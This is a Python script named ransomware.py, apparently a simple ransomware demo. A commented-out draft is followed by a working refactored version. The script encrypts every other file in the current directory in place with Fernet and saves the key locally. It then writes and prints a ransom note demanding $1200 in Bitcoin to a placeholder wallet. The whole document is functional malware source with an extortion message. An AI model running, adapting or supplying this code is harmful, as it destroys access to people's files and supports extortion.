# #!/usr/bin/env python3

# import os
# from cryptography.fernet import Fernet

# # Collect files to encrypt
# files = []

# for file in os.listdir():
#     if file in ("ransomware.py", "thekey.key", "decrypt.py", "requirements.sh", "encryption_log.txt"):
#         continue
#     if os.path.isfile(file):
#         files.append(file)

# # Generate encryption key
# key = Fernet.generate_key()

# # Save the key securely
# try:
#     with open("thekey.key", "wb") as thekey:
#         thekey.write(key)
#     print("[INFO] Encryption key saved to 'thekey.key'.")
# except Exception as e:
#     print(f"[ERROR] Could not save the key: {e}")
#     exit(1)

# # Encrypt each file
# log_file = "encryption_log.txt"
# try:
#     with open(log_file, "w") as log:
#         for file in files:
#             try:
#                 with open(file, "rb") as thefile:
#                     contents = thefile.read()
#                 contents_encrypted = Fernet(key).encrypt(contents)
#                 with open(file, "wb") as thefile:
#                     thefile.write(contents_encrypted)
#                 log.write(f"{file}\n")  # Log the encrypted file
#                 print(f"[INFO] Encrypted: {file}")
#             except Exception as e:
#                 print(f"[ERROR] Could not encrypt {file}: {e}")
# except Exception as e:
#     print(f"[ERROR] Could not create log file: {e}")
#     exit(1)

# # Save ransom note in a text file
# ransom_note = """
# [NOTICE] All files have been encrypted.
# To decrypt your files, send $1200 to the following Bitcoin wallet: example@bitcoinwallet.com.
# Once payment is received, you will be sent a decryption key.
# """
# try:
#     with open("RANSOM_NOTE.txt", "w") as note:
#         note.write(ransom_note)
#     print("[INFO] Ransom note saved to 'RANSOM_NOTE.txt'.")
# except Exception as e:
#     print(f"[ERROR] Could not save ransom note: {e}")

# # Display ransom note in terminal
# print(ransom_note)
#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet
import logging

# Setup logging
logging.basicConfig(filename='encryption_log.txt', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

def collect_files():
    files = []
    for file in os.listdir():
        if file in ("ransomware.py", "thekey.key", "decrypt.py", "requirements.sh", "encryption_log.txt"):
            continue
        if os.path.isfile(file):
            files.append(file)
    return files

def generate_key():
    return Fernet.generate_key()

def save_key(key):
    try:
        with open("thekey.key", "wb") as thekey:
            thekey.write(key)
        logging.info("Encryption key saved to 'thekey.key'.")
    except Exception as e:
        logging.error(f"Could not save the key: {e}")
        exit(1)

def encrypt_files(files, key):
    for file in files:
        try:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_encrypted = Fernet(key).encrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_encrypted)
            logging.info(f"Encrypted: {file}")
        except Exception as e:
            logging.error(f"Could not encrypt {file}: {e}")

def save_ransom_note():
    ransom_note = """
    [NOTICE] All files have been encrypted.
    To decrypt your files, send $1200 to the following Bitcoin wallet: example@bitcoinwallet.com.
    Once payment is received, you will be sent a decryption key.
    """
    try:
        with open("RANSOM_NOTE.txt", "w") as note:
            note.write(ransom_note)
        logging.info("Ransom note saved to 'RANSOM_NOTE.txt'.")
    except Exception as e:
        logging.error(f"Could not save ransom note: {e}")
    print(ransom_note)

if __name__ == "__main__":
    files_to_encrypt = collect_files()
    encryption_key = generate_key()
    save_key(encryption_key)
    encrypt_files(files_to_encrypt, encryption_key)
    save_ransom_note()
